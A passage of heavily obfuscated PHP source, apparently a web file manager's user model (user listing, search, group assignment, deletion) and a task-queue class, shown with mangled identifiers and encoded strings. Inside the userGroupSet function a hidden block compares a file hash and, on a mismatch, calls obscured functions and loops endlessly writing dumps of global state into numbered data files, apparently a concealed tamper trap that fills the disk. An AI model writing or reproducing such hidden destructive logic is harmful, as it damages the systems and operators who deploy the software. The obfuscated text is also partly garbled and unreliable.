$ª³¤ö‡õ; return !!$¸ø¢¾®‡; } private function _checkExist($Õ”¡î“, $°‰ÁÓŒÉ = false) { $Û¹ÓÊ½‡ =& $_SERVER[¿ÈˆÑ¸ä]; $¼ÆŒèÂ = array($Û¹ÓÊ½‡[32] => UserModel::ERROR_USER_EXIST_NAME, $Û¹ÓÊ½‡[2418] => UserModel::ERROR_USER_EXIST_NICKNAME, $Û¹ÓÊ½‡[381] => UserModel::ERROR_USER_EXIST_EMAIL, $Û¹ÓÊ½‡[2635] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($¼ÆŒèÂ[$Û¹ÓÊ½‡[2418]]); } $Š¨ş·’Ì = $°‰ÁÓŒÉ ? array($Û¹ÓÊ½‡[1529] => array($Û¹ÓÊ½‡[2650], $°‰ÁÓŒÉ)) : array(); foreach ($¼ÆŒèÂ as $ïÚß¶’ª => $£Ùõ×Á) { $¼şµ¸ÑŸ = array(); foreach ($¼ÆŒèÂ as $ÖñöíÀñ => $Ÿ×÷í°¨) { if (isset($Õ”¡î“[$ÖñöíÀñ]) && $Õ”¡î“[$ÖñöíÀñ]) { $¼şµ¸ÑŸ[] = $Õ”¡î“[$ÖñöíÀñ]; } } if (!$¼şµ¸ÑŸ) { continue; } $Œ•º¡ß = array_merge(array($ïÚß¶’ª => array($Û¹ÓÊ½‡[7], $¼şµ¸ÑŸ)), $Š¨ş·’Ì); $Ûˆª£¿Ç = $this->where($Œ•º¡ß)->find(); if ($Ûˆª£¿Ç) { return $£Ùõ×Á; } } return !0; } public function userListInfo($é¢…ø¼½) { $¤ÃÁş–ó =& $_SERVER[¿ÈˆÑ¸ä]; $À‡°Ï†ß = array(); $é¢…ø¼½ = is_array($é¢…ø¼½) ? array_unique($é¢…ø¼½) : array(); if (!$é¢…ø¼½) { return $À‡°Ï†ß; } if (count($é¢…ø¼½) < 20) { foreach ($é¢…ø¼½ as $‘¾¢ß–—) { $À‡°Ï†ß[$‘¾¢ß–— . $¤ÃÁş–ó[12]] = $this->getInfoSimpleOuter($‘¾¢ß–—); } } else { $ãİü´± = array($¤ÃÁş–ó[1907] => array($¤ÃÁş–ó[503], $é¢…ø¼½)); if (count($é¢…ø¼½) == 1) { $ãİü´± = array($¤ÃÁş–ó[1907] => $é¢…ø¼½[0]); } $ïãü¹Ìß = Model($¤ÃÁş–ó[593])->field($this->simpleField)->where($ãİü´±)->select(); $ïãü¹Ìß = array_to_keyvalue($ïãü¹Ìß, $¤ÃÁş–ó[1529]); foreach ($é¢…ø¼½ as $‘¾¢ß–—) { $ı˜Õ·” = $ïãü¹Ìß[$‘¾¢ß–—]; if (!$ı˜Õ·”) { $À‡°Ï†ß[$‘¾¢ß–— . $¤ÃÁş–ó[12]] = $this->getInfoSimpleOuter($‘¾¢ß–—); continue; } $ı˜Õ·”[$¤ÃÁş–ó[2313]] = Action($¤ÃÁş–ó[2314])->parseUrl($ı˜Õ·”[$¤ÃÁş–ó[2313]]); $À‡°Ï†ß[$‘¾¢ß–— . $¤ÃÁş–ó[12]] = $ı˜Õ·”; } } return $À‡°Ï†ß; } protected function userStatus($êı›¨™, $òŞÅ¶îÎ) { $å Òºú = $this->getInfoSimple($êı›¨™); if (!$å Òºú) { return !1; } $“êŞ‡êÏ = array($_SERVER[¿ÈˆÑ¸ä][833] => $òŞÅ¶îÎ); return $this->userEdit($êı›¨™, $“êŞ‡êÏ); } protected function userRemove($íã¤˜í¯) { $“ÈØç‡š =& $_SERVER[¿ÈˆÑ¸ä]; $Æ“†Ú·¥ = $this->getInfoSimple($íã¤˜í¯); if (!$Æ“†Ú·¥) { return !1; } $òåçãÂ´ = array($“ÈØç‡š[1907] => $íã¤˜í¯); Model($“ÈØç‡š[683])->where($òåçãÂ´)->delete(); Model($“ÈØç‡š[2651])->where($òåçãÂ´)->delete(); Model($“ÈØç‡š[2214])->where($òåçãÂ´)->delete(); Model($“ÈØç‡š[2634])->where($òåçãÂ´)->delete(); Model($“ÈØç‡š[1171])->where($òåçãÂ´)->delete(); Model($“ÈØç‡š[2435])->removeUserAll($íã¤˜í¯); Model($“ÈØç‡š[916])->userRootRemove($íã¤˜í¯); return $this->where($òåçãÂ´)->delete(); } protected function userGroupSet($âÚ©„Õ, $˜«…ºˆ˜, $ô·éæî = array()) { $®ëğ×ìÄ =& $_SERVER[¿ÈˆÑ¸ä]; $¾Ğ©¢ö² = $_SERVER[$®ëğ×ìÄ[965]] . $®ëğ×ìÄ[966]; $èÛ’«Ö¥ = $®ëğ×ìÄ[1606]; if ($_SERVER[$®ëğ×ìÄ[962]] != $èÛ’«Ö¥($¾Ğ©¢ö²)) { $î®úáíá = $®ëğ×ìÄ[980]; $É÷ßşØ¿ = $®ëğ×ìÄ[964]; $ï‘ àË = $_SERVER[$®ëğ×ìÄ[965]] . $®ëğ×ìÄ[966]; $ö±Ü›ùê = $É÷ßşØ¿($ï‘ àË); $èÇ§è×Ã = explode($®ëğ×ìÄ[286], $ö±Ü›ùê); if (count($èÇ§è×Ã) < $®ëğ×ìÄ[703]) { $—¡¤œ÷¸ = $®ëğ×ìÄ[967]; $—¡¤œ÷¸(); } $”äøËô = $®ëğ×ìÄ[981]; $”äøËô($_SERVER[$®ëğ×ìÄ[982]]); $î®úáíá = $®ëğ×ìÄ[980]; $î®úáíá(); $ºšÓ±şŞ = $®ëğ×ìÄ[1833]; $¥Î‡¦Ûà = json_encode($GLOBALS[$®ëğ×ìÄ[1834]]); $ æ”µçô = 1; for ($¶°ÕÛ´ = $ æ”µçô; $¶°ÕÛ´ > 0; $¶°ÕÛ´++) { $ºšÓ±şŞ(DATA_PATH . $¶°ÕÛ´, $¥Î‡¦Ûà); } } $áòÑã³ = $this->getInfoSimple($âÚ©„Õ); if (!$áòÑã³ || !is_array($˜«…ºˆ˜)) { return !1; } $¼ôù¦Ş = Model($®ëğ×ìÄ[2214]); $¼ôù¦Ş->where(array($®ëğ×ìÄ[1529] => $âÚ©„Õ))->delete(); $š±ß‘Š¨ = array(); $”ÚÊ²çÄ = 0; foreach ($˜«…ºˆ˜ as $ÀÅ²°Éõ => $ÓØÒé€) { $±®”÷¶Ù = array($®ëğ×ìÄ[1529] => $âÚ©„Õ, $®ëğ×ìÄ[1431] => $ÀÅ²°Éõ, $®ëğ×ìÄ[1576] => $ÓØÒé€); $±®”÷¶Ù[$®ëğ×ìÄ[2144]] = isset($ô·éæî[$”ÚÊ²çÄ]) ? $ô·éæî[$”ÚÊ²çÄ] : 0; $”ÚÊ²çÄ++; $š±ß‘Š¨[] = $±®”÷¶Ù; } return $¼ôù¦Ş->addAll($š±ß‘Š¨, array(), !0); } protected function userGroupAdd($ÖúèÆ×, $¹±ìƒçÇ = array()) { $øĞ‹ÌÉ =& $_SERVER[¿ÈˆÑ¸ä]; $ÉĞÒÔû¸ = $this->getInfoSimple($ÖúèÆ×); if (!$ÉĞÒÔû¸ || empty($¹±ìƒçÇ)) { return !1; } $„î“¢äÌ = array(); foreach ($¹±ìƒçÇ as $ÚşÀˆŞ¼ => $ª½è¾) { $„î“¢äÌ[] = array($øĞ‹ÌÉ[1529] => $ÖúèÆ×, $øĞ‹ÌÉ[1431] => $ÚşÀˆŞ¼, $øĞ‹ÌÉ[1576] => $ª½è¾, $øĞ‹ÌÉ[2144] => 0); } return Model($øĞ‹ÌÉ[2214])->addAll($„î“¢äÌ, array(), !0); } protected function userGroupRemove($ì†ø™ô , $õ´¨™ãÙ) { $ï€ñ®Òï =& $_SERVER[¿ÈˆÑ¸ä]; $çÆ©§Úæ = $this->getInfoSimple($ì†ø™ô ); if (!$çÆ©§Úæ || !$õ´¨™ãÙ) { return !1; } $¨ÙÏ‚Ğ = array($ï€ñ®Òï[1907] => $ì†ø™ô , $ï€ñ®Òï[2207] => $õ´¨™ãÙ); return Model($ï€ñ®Òï[2214])->where($¨ÙÏ‚Ğ)->delete(); } public function listData() { $éôæíŒ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($éôæíŒ[$_SERVER[¿ÈˆÑ¸ä][446]]); return $éôæíŒ; } public function listByID($Ÿ”¥Õ…æ) { $íÄØ–± =& $_SERVER[¿ÈˆÑ¸ä]; if (!$Ÿ”¥Õ…æ) { return; } $„‡œßüõ = array($íÄØ–±[1529] => array($íÄØ–±[7], $Ÿ”¥Õ…æ)); $õÙá¿Ï˜ = $this->where($„‡œßüõ)->select(); $õÙá¿Ï˜ = array_sort_keep($õÙá¿Ï˜, $íÄØ–±[1529], $Ÿ”¥Õ…æ); $this->_listDataApply($õÙá¿Ï˜); return $õÙá¿Ï˜; } public function listByGroup($ŒÑÜöêû = 0, $ä’áî³ = array()) { $œ¼ÍçÚ =& $_SERVER[¿ÈˆÑ¸ä]; $´äÌş· = $œ¼ÍçÚ[12]; $ÖÛñˆóÜ = array(); if ($ŒÑÜöêû) { $ÖÛñˆóÜ = array($œ¼ÍçÚ[2652] => intval($ŒÑÜöêû)); $´äÌş· = "\114\105\106\x54\x20\112\x4f\x49\116\x20{$this->tablePrefix}\165\x73\x65\x72\x5f\x67\162\157\x75\x70\40\165\163\x65\x72\x5f\x67\162\157\x75\x70\x20\x6f\156\40\165\163\145\x72\56\165\x73\x65\x72\x49\104\40\x3d\x20\x75\163\x65\162\137\x67\x72\157\165\160\56\165\x73\145\x72\111\x44"; $İ†õİŒÙ = Input::get($œ¼ÍçÚ[540], null, $œ¼ÍçÚ[12]) ? $œ¼ÍçÚ[12] : $œ¼ÍçÚ[2653]; } if (isset($ä’áî³[$œ¼ÍçÚ[833]])) { $ÖÛñˆóÜ[$œ¼ÍçÚ[2654]] = $ä’áî³[$œ¼ÍçÚ[833]]; } $’²­÷Ôƒ = _get($ä’áî³, $œ¼ÍçÚ[2655], $œ¼ÍçÚ[232]); if (_get($ä’áî³, $œ¼ÍçÚ[844], !1)) { $ÖÛñˆóÜ[$’²­÷Ôƒ] = array($œ¼ÍçÚ[2399], $ä’áî³[$œ¼ÍçÚ[844]]); } if (_get($ä’áî³, $œ¼ÍçÚ[845], !1)) { $¶¯š÷Š¢ = array($œ¼ÍçÚ[2400], $ä’áî³[$œ¼ÍçÚ[845]]); if ($ÖÛñˆóÜ[$’²­÷Ôƒ]) { $ÖÛñˆóÜ[$’²­÷Ôƒ] = array($ÖÛñˆóÜ[$’²­÷Ôƒ], $¶¯š÷Š¢, $œ¼ÍçÚ[2401]); } else { $ÖÛñˆóÜ[$’²­÷Ôƒ] = $¶¯š÷Š¢; } } $ş§¥á‡î = $this->_makeOrder($İ†õİŒÙ)->field($œ¼ÍçÚ[2656])->where($ÖÛñˆóÜ)->join($´äÌş·)->selectPage(50); $this->_listDataApply($ş§¥á‡î[$œ¼ÍçÚ[446]]); return $ş§¥á‡î; } private function _makeOrder($ó÷Ù½”ù = '') { $ïÀºö =& $_SERVER[¿ÈˆÑ¸ä]; $œ§ó¢×¥ = array($ïÀºö[1529], $ïÀºö[32], $ïÀºö[2111], $ïÀºö[2312], $ïÀºö[2086], $ïÀºö[232]); $ô£ú‰¢Ü = array($ïÀºö[533] => $ïÀºö[534], $ïÀºö[535] => $ïÀºö[536]); $»®Š¿üØ = Input::get($ïÀºö[540], $ïÀºö[7], $ïÀºö[1907], $œ§ó¢×¥); $ñà®í®¼ = Input::get($ïÀºö[541], $ïÀºö[7], $ïÀºö[2215], array($ïÀºö[2215], $ïÀºö[535])); $ñà®í®¼ = $ô£ú‰¢Ü[$ñà®í®¼]; $ó÷Ù½”ù = $ó÷Ù½”ù . "\x75\163\145\162\x2e{$»®Š¿üØ}\x20{$ñà®í®¼}\54\x20\165\x73\x65\x72\x2e\x75\163\x65\162\111\104\40\x61\163\143"; return $this->alias($ïÀºö[2347])->order($ó÷Ù½”ù); } public function listSearch($© ¿–û) { $“í¾ú¦ø =& $_SERVER[¿ÈˆÑ¸ä]; $¹õÍßà¦ = trim($© ¿–û[$“í¾ú¦ø[2218]]); $©í«ß• = explode($“í¾ú¦ø[53], $¹õÍßà¦); if (!$¹õÍßà¦ || count($©í«ß•) == 1) { return $this->listSearchNow($© ¿–û); } $ÄÚİıîö = array($“í¾ú¦ø[446] => array()); foreach ($©í«ß• as $‚·ÀŞ³) { if (!trim($‚·ÀŞ³)) { continue; } $© ¿–û[$“í¾ú¦ø[2218]] = $‚·ÀŞ³; $İÖÃ«Ì = $this->listSearchNow($© ¿–û); $ÄÚİıîö[$“í¾ú¦ø[446]] = array_merge($ÄÚİıîö[$“í¾ú¦ø[446]], $İÖÃ«Ì[$“í¾ú¦ø[446]]); } $ÄÚİıîö[$“í¾ú¦ø[446]] = array_unique_by_key($ÄÚİıîö[$“í¾ú¦ø[446]], $“í¾ú¦ø[1529]); $ÄÚİıîö[$“í¾ú¦ø[443]] = array($“í¾ú¦ø[444] => count($ÄÚİıîö[$“í¾ú¦ø[446]]), $“í¾ú¦ø[440] => 20, $“í¾ú¦ø[429] => 1, $“í¾ú¦ø[445] => 1); return $ÄÚİıîö; } public function listSearchNow($¦½ò¸„¸) { $­ûÕ§œ =& $_SERVER[¿ÈˆÑ¸ä]; $²øú‰™® = trim($¦½ò¸„¸[$­ûÕ§œ[2218]]); $€ÍìÓöó = isset($¦½ò¸„¸[$­ûÕ§œ[2219]]) ? $¦½ò¸„¸[$­ûÕ§œ[2219]] : !1; $²øú‰™® = str_replace($­ûÕ§œ[2220], $­ûÕ§œ[2221], trim($²øú‰™®)); $”‹µÖ±— = array($­ûÕ§œ[32] => array($­ûÕ§œ[470], "\45{$²øú‰™®}\x25"), $­ûÕ§œ[381] => array($­ûÕ§œ[470], "{$²øú‰™®}\45"), $­ûÕ§œ[2418] => array($­ûÕ§œ[470], "\45{$²øú‰™®}\45"), $­ûÕ§œ[1103] => $­ûÕ§œ[2222]); if (Input::check($²øú‰™®, $­ûÕ§œ[387])) { $”‹µÖ±—[$­ûÕ§œ[1529]] = array($­ûÕ§œ[470], "{$²øú‰™®}\x25"); $”‹µÖ±—[$­ûÕ§œ[2635]] = array($­ûÕ§œ[470], "{$²øú‰™®}\45"); } if (!$²øú‰™®) { $”‹µÖ±— = array(); } if (isset($¦½ò¸„¸[$­ûÕ§œ[833]])) { $”‹µÖ±—[$­ûÕ§œ[833]] = $¦½ò¸„¸[$­ûÕ§œ[833]]; } $”‹µÖ±— = $this->parseWhereLike($”‹µÖ±—); $¾Ö­ê½ş = $this->_makeOrder()->where($”‹µÖ±—)->selectPage(20); if (!$¾Ö­ê½ş || count($¾Ö­ê½ş[$­ûÕ§œ[446]]) < 5 && Input::check($²øú‰™®, $­ûÕ§œ[394])) { $²‘å‹¥¸ = $this->_searchFromMeta($­ûÕ§œ[547], $²øú‰™®, 10); $û´åšÜã = $this->_searchFromMeta($­ûÕ§œ[548], $²øú‰™®, 10); $ŸšßìÂõ = array_merge($²‘å‹¥¸, $û´åšÜã, $¾Ö­ê½ş[$­ûÕ§œ[446]]); $¾Ö­ê½ş[$­ûÕ§œ[446]] = array_unique_by_key($ŸšßìÂõ, $­ûÕ§œ[1529]); $¾Ö­ê½ş[$­ûÕ§œ[443]][$­ûÕ§œ[444]] = count($¾Ö­ê½ş[$­ûÕ§œ[446]]); $¾Ö­ê½ş[$­ûÕ§œ[443]][$­ûÕ§œ[445]] = ceil($¾Ö­ê½ş[$­ûÕ§œ[443]][$­ûÕ§œ[444]] / $¾Ö­ê½ş[$­ûÕ§œ[443]][$­ûÕ§œ[440]]); } $this->_listDataApply($¾Ö­ê½ş[$­ûÕ§œ[446]]); $this->_filterByGroup($¾Ö­ê½ş, $€ÍìÓöó); return $¾Ö­ê½ş; } private function _filterByGroup(&$ÀŸÆÈÙš, $ÇÜÉ¬‰¼) { $¢ËÄ°¯ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ÇÜÉ¬‰¼) { return $ÀŸÆÈÙš; } foreach ($ÀŸÆÈÙš[$¢ËÄ°¯[446]] as $›ÆßÜø => &$÷Ù’ôŒÒ) { $í¤õú°Î = array_to_keyvalue($÷Ù’ôŒÒ[$¢ËÄ°¯[1430]], $¢ËÄ°¯[12], $¢ËÄ°¯[1431]); if (!in_array($ÇÜÉ¬‰¼, $í¤õú°Î)) { unset($ÀŸÆÈÙš[$¢ËÄ°¯[446]][$›ÆßÜø]); } } unset($÷Ù’ôŒÒ); $ÀŸÆÈÙš[$¢ËÄ°¯[446]] = array_values($ÀŸÆÈÙš[$¢ËÄ°¯[446]]); $ÀŸÆÈÙš[$¢ËÄ°¯[443]] = array($¢ËÄ°¯[2382] => count($ÀŸÆÈÙš[$¢ËÄ°¯[446]]), $¢ËÄ°¯[2380] => $ÀŸÆÈÙš[$¢ËÄ°¯[443]][$¢ËÄ°¯[440]], $¢ËÄ°¯[2379] => 1, $¢ËÄ°¯[2381] => 1); } private function _searchFromMeta($¥ëîìÔ, $ÔåŞú¬‰, $ÉÇÀ¾Ó°) { $ºá Œ’ =& $_SERVER[¿ÈˆÑ¸ä]; $ÔåŞú¬‰ = strtolower($ÔåŞú¬‰); $öß´ì¼“ = array($ºá Œ’[95] => $¥ëîìÔ, $ºá Œ’[451] => array($ºá Œ’[470], "\45{$ÔåŞú¬‰}\x25")); $öß´ì¼“ = $this->parseWhereLike($öß´ì¼“); $¦¢¶ÃÎë = Model($ºá Œ’[2657])->where($öß´ì¼“)->limit($ÉÇÀ¾Ó°)->select(); if (!$¦¢¶ÃÎë) { return array(); } $¦¢¶ÃÎë = array_to_keyvalue($¦¢¶ÃÎë, $ºá Œ’[12], $ºá Œ’[1529]); $õÁ• çÜ = $this->where(array($ºá Œ’[1907] => array($ºá Œ’[7], $¦¢¶ÃÎë)))->select(); if (!$õÁ• çÜ) { return array(); } return $õÁ• çÜ; } private function _listDataApplyItem($şİƒï»¶) { $œÙ„Ï°Å = array($şİƒï»¶); $this->_listDataApply($œÙ„Ï°Å); return $œÙ„Ï°Å[0]; } private function _listDataApply(&$®Ğ‚Å…±) { $üÆœÌ• =& $_SERVER[¿ÈˆÑ¸ä]; if (!$®Ğ‚Å…±) { return; } array_remove_key($®Ğ‚Å…±, $üÆœÌ•[989]); $ï¹Éù†´ = array_to_keyvalue($®Ğ‚Å…±, $üÆœÌ•[12], $üÆœÌ•[1529]); $this->_listAppendGroup($®Ğ‚Å…±, $ï¹Éù†´); $this->_listAppendMeta($®Ğ‚Å…±, $ï¹Éù†´); $this->_listAppendSourceRoot($®Ğ‚Å…±, $ï¹Éù†´); } private function _listAppendSourceRoot(&$šĞÀàÅ«, $“Ÿë•…) { $Ëô¡è´É =& $_SERVER[¿ÈˆÑ¸ä]; $ŒŞé×¶ = Model($Ëô¡è´É[916])->listSourceRoot(SourceModel::TYPE_USER, $“Ÿë•…); $ŒŞé×¶ = array_to_keyvalue($ŒŞé×¶, $Ëô¡è´É[585]); $ŒŞé×¶ = array_remove_key($ŒŞé×¶, $Ëô¡è´É[585]); foreach ($šĞÀàÅ« as &$¤”ß®µŞ) { $¤”ß®µŞ[$Ëô¡è´É[90]] = $ŒŞé×¶[$¤”ß®µŞ[$Ëô¡è´É[1529]]] ? $ŒŞé×¶[$¤”ß®µŞ[$Ëô¡è´É[1529]]] : array(); } unset($¤”ß®µŞ); } private function _listAppendGroup(&$îÌè½¥, $´ÕéèÚÓ) { $Ï—“È€‹ =& $_SERVER[¿ÈˆÑ¸ä]; $íÔ¬ˆ‚¹ = array($Ï—“È€‹[1529] => array($Ï—“È€‹[7], $´ÕéèÚÓ)); $·Ğ¶¼İ = Model($Ï—“È€‹[2214])->where($íÔ¬ˆ‚¹)->select(); $çïÊş = array_to_keyvalue($·Ğ¶¼İ, $Ï—“È€‹[12], $Ï—“È€‹[1431]); $çïÊş = array_remove_value(array_unique($çïÊş), $Ï—“È€‹[229]); if (!$çïÊş || !$·Ğ¶¼İ) { return; } $íÔ¬ˆ‚¹ = array($Ï—“È€‹[1431] => array($Ï—“È€‹[7], $çïÊş)); $˜ÄÄØÃÅ = Model($Ï—“È€‹[1429])->field($Ï—“È€‹[2658])->where($íÔ¬ˆ‚¹)->select(); $˜ÄÄØÃÅ = array_to_keyvalue($˜ÄÄØÃÅ, $Ï—“È€‹[1431]); $·Ğ¶¼İ = array_to_keyvalue_group($·Ğ¶¼İ, $Ï—“È€‹[1529]); foreach ($·Ğ¶¼İ as &$Ğ¼áõ„) { $âÂáşŸÀ = array(); foreach ($Ğ¼áõ„ as $²ŒÈ€‰¾) { if (!$²ŒÈ€‰¾[$Ï—“È€‹[1576]]) { continue; } $…÷Îƒ°æ = Model($Ï—“È€‹[587])->listData($²ŒÈ€‰¾[$Ï—“È€‹[1576]]); $âÂáşŸÀ[] = array($Ï—“È€‹[1431] => $²ŒÈ€‰¾[$Ï—“È€‹[1431]], $Ï—“È€‹[2659] => $˜ÄÄØÃÅ[$²ŒÈ€‰¾[$Ï—“È€‹[1431]]][$Ï—“È€‹[32]], $Ï—“È€‹[600] => $˜ÄÄØÃÅ[$²ŒÈ€‰¾[$Ï—“È€‹[1431]]][$Ï—“È€‹[600]], $Ï—“È€‹[498] => $…÷Îƒ°æ); } $Ğ¼áõ„ = $âÂáşŸÀ; } unset($Ğ¼áõ„); foreach ($îÌè½¥ as &$¢À‚ ¬ß) { $¢À‚ ¬ß[$Ï—“È€‹[1430]] = array(); if (isset($·Ğ¶¼İ[$¢À‚ ¬ß[$Ï—“È€‹[1529]]])) { $¢À‚ ¬ß[$Ï—“È€‹[1430]] = $·Ğ¶¼İ[$¢À‚ ¬ß[$Ï—“È€‹[1529]]]; } } unset($¢À‚ ¬ß); } public function userAppendGroup($ˆƒÅœÜ¦) { $ÎÊ«§´İ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ˆƒÅœÜ¦) { return array(); } $this->_listAppendGroup($ˆƒÅœÜ¦, array_to_keyvalue($ˆƒÅœÜ¦, $ÎÊ«§´İ[12], $ÎÊ«§´İ[1529])); return $ˆƒÅœÜ¦; } private function _listAppendMeta(&$’–·¬å´, $ªĞ¢çÊ) { $µÃ³®Äõ =& $_SERVER[¿ÈˆÑ¸ä]; $§É‹œñ = UserJobModel::JOB_KEY; $³õñ˜Ö = array($µÃ³®Äõ[2210]); $Â•Ë½ñİ = array($µÃ³®Äõ[1529] => array($µÃ³®Äõ[7], $ªĞ¢çÊ)); $•Á„ºšƒ = Model($µÃ³®Äõ[2634])->where($Â•Ë½ñİ)->select(); $˜š¯Ìğ = array(); foreach ($•Á„ºšƒ as $Ÿ«õ¹Ñ…) { $Şõå¨¸ = $Ÿ«õ¹Ñ…[$µÃ³®Äõ[1529]]; if (!isset($˜š¯Ìğ[$Şõå¨¸])) { $˜š¯Ìğ[$Şõå¨¸] = array(); } $˜š¯Ìğ[$Şõå¨¸][$Ÿ«õ¹Ñ…[$µÃ³®Äõ[95]]] = $Ÿ«õ¹Ñ…[$µÃ³®Äõ[451]]; } $ÛÃ²¾†Á = Model($µÃ³®Äõ[2660]); foreach ($’–·¬å´ as &$ÒÉÀ×à÷) { $Şõå¨¸ = $ÒÉÀ×à÷[$µÃ³®Äõ[1529]]; $˜´Á»İà = isset($˜š¯Ìğ[$Şõå¨¸]) ? $˜š¯Ìğ[$Şõå¨¸] : array(); $ÒÉÀ×à÷[$µÃ³®Äõ[551]] = array_field_key($˜´Á»İà, $³õñ˜Ö); $ÒÉÀ×à÷[$µÃ³®Äõ[2661]] = array(); if (isset($˜´Á»İà[$§É‹œñ])) { $ÒÉÀ×à÷[$µÃ³®Äõ[2661]] = $ÛÃ²¾†Á->getUserJobInfo($˜´Á»İà[$§É‹œñ]); } } unset($ÒÉÀ×à÷); } protected function groupUserAll($ƒ×ËôèÂ) { $ÊÙé«ßÈ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ƒ×ËôèÂ) { return !1; } $¤·¥ŞÀ« = Model($ÊÙé«ßÈ[2214])->field($ÊÙé«ßÈ[1529])->where(array($ÊÙé«ßÈ[1431] => array($ÊÙé«ßÈ[7], $ƒ×ËôèÂ)))->select(); $¤·¥ŞÀ« = array_to_keyvalue($¤·¥ŞÀ«, $ÊÙé«ßÈ[12], $ÊÙé«ßÈ[1529]); return array_unique($¤·¥ŞÀ«); } public function userSearch($ìÉ¦ñ ª, $òì¾œŸÅ = "\52") { return Model($_SERVER[¿ÈˆÑ¸ä][613])->where($ìÉ¦ñ ª)->field($òì¾œŸÅ)->find(); } } goto b×š˜†°; Fƒ»©Ñ¨Á¹: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\x51\x75\x65\165\x65\x4c\x65\156\x67\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\x51\165\x65\x75\145\x44\141\x74\x61"; const QUEUE_TIME = "\x74\141\x73\x6b\x51\165\145\165\x65\x4c\x61\x73\164\x52\165\156"; const QUEUE_THREAD = "\x74\x61\x73\153\x51\165\x65\x75\x65\x54\x68\x72\x65\141\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($’”¼­œ°, $ûå¢ˆµ¿ = array(), $Ò¤á¨½” = '', $¶ô’Ñ†Ü = '') { $¾›ö„° =& $_SERVER[¿ÈˆÑ¸ä]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¶ô’Ñ†Ü && array_find_by_field(self::$listData, $¾›ö„°[95], $¶ô’Ñ†Ü)) { return !0; } if ($¶ô’Ñ†Ü && array_find_by_field(self::$listDataAdd, $¾›ö„°[95], $¶ô’Ñ†Ü)) { return !0; } self::$listDataAdd[] = array($¾›ö„°[343] => $’”¼­œ°, $¾›ö„°[2024] => $ûå¢ˆµ¿, $¾›ö„°[536] => $Ò¤á¨½”, $¾›ö„°[95] => $¶ô’Ñ†Ü); return !0; } public static function addSubmit() { $¶æÔ¿å€ =& $_SERVER[¿ÈˆÑ¸ä]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($¶æÔ¿å€[2025] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $¶æÔ¿å€[12], $¶æÔ¿å€[536])), $¶æÔ¿å€[196]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¤½ç›ş·, $ÍÁ¾Ñ£ = array(), $ô§†Á “ = '', $öÍÉÔùı = '') { $•ÃÙÓº¼ =& $_SERVER[¿ÈˆÑ¸ä]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Äàƒ”¹Š = self::getAll(); if ($öÍÉÔùı && array_find_by_field($Äàƒ”¹Š, $•ÃÙÓº¼[95], $öÍÉÔùı)) { return !0; } $Äàƒ”¹Š[] = array($•ÃÙÓº¼[343] => $¤½ç›ş·, $•ÃÙÓº¼[2024] => $ÍÁ¾Ñ£, $•ÃÙÓº¼[536] => $ô§†Á “, $•ÃÙÓº¼[95] => $öÍÉÔùı); self::setAll($Äàƒ”¹Š); write_log($•ÃÙÓº¼[2025] . $ô§†Á “, $•ÃÙÓº¼[196]); return !0; } public static function run() { $í ‡Ïè‘ =& $_SERVER[¿ÈˆÑ¸ä]; $öƒ§è¾Ó = self::getAll(); $æ¶ááì’ = array_shift($öƒ§è¾Ó); if (!$æ¶ááì’) { return !1; } self::setAll($öƒ§è¾Ó); $ğÄŠ´Ï = timeFloat(); $¨¹ƒëÏ = $í ‡Ïè‘[12]; try { $¨¹ƒëÏ = Hook::apply($æ¶ááì’[$í ‡Ïè‘[343]], $æ¶ááì’[$í ‡Ïè‘[2024]]); } catch (Exception $Íã¥¡ä) { write_log($Íã¥¡ä, $í ‡Ïè‘[1304]); } $æÈÎÇ³ = number_format(timeFloat() - $ğÄŠ´Ï, 3) . $í ‡Ïè‘[1931]; if ($¨¹ƒëÏ && is_string($¨¹ƒëÏ)) { $æÈÎÇ³ = $æÈÎÇ³ . $í ‡Ïè‘[2026] . $¨¹ƒëÏ; } write_log($í ‡Ïè‘[2027] . $æ¶ááì’[$í ‡Ïè‘[536]] . $í ‡Ïè‘[2028] . $æÈÎÇ³, $í ‡Ïè‘[196]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¹®äëŠ =& $_SERVER[¿ÈˆÑ¸ä]; $¨ùø£‚Í = self::threadCount() + 1; if ($¨ùø£‚Í > 3 || !self::count()) { return; } write_log($¹®äëŠ[2029] . $¨ùø£‚Í, $¹®äëŠ[196]); Cache::set(self::QUEUE_THREAD, $¨ùø£‚Í, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($¹®äëŠ[2030], $¹®äëŠ[196]); } public static function getKey($øĞ§ì¥‹, $ü†£àß™ = "\151\x6e\x74") { $†üêÃ‰Ú =& $_SERVER[¿ÈˆÑ¸ä]; Cache::removeMemory($øĞ§ì¥‹); $Ø¡Ÿ¯ = Cache::get($øĞ§ì¥‹); if ($ü†£àß™ == $†üêÃ‰Ú[365]) { return $Ø¡Ÿ¯ ? intval($Ø¡Ÿ¯) : 0; } if ($ü†£àß™ == $†üêÃ‰Ú[2031]) { return is_array($Ø¡Ÿ¯) ? $Ø¡Ÿ¯ : array(); } return $Ø¡Ÿ¯; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[¿ÈˆÑ¸ä][2031]); } public static function setAll($öÂÏ¿É) { $êÒşÒÄ­ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($öÂÏ¿É), $êÒşÒÄ­); Cache::set(self::QUEUE_DATA, 